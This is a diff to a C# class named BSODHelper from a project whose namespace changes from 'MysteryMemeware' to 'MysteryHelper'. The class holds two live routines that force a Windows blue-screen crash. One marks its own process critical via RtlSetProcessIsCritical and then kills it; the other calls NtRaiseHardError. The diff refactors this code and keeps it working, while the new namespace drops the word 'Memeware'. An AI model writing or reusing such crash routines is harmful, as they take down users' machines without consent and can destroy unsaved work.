@@ -1,4 +1,4 @@
-﻿namespace MysteryMemeware
+﻿namespace MysteryHelper
 {
     public static class BSODHelper
     {
@@ -10,12 +10,11 @@
             }
             catch
             {
-
             }
             bool previousCriticalValue = false;
             bool* previousCriticalValuePointer = &previousCriticalValue;
             RtlSetProcessIsCritical(true, previousCriticalValuePointer, false);
-            System.Diagnostics.Process.GetCurrentProcess().Kill();
+            ProcessHelper.CurrentProcess.Kill();
         }
         public static void BSODRHE()
         {
@@ -25,7 +24,6 @@
             }
             catch
             {
-
             }
             NtRaiseHardError(0xc0000022, 0, 0, System.IntPtr.Zero, 6, out _);
         }
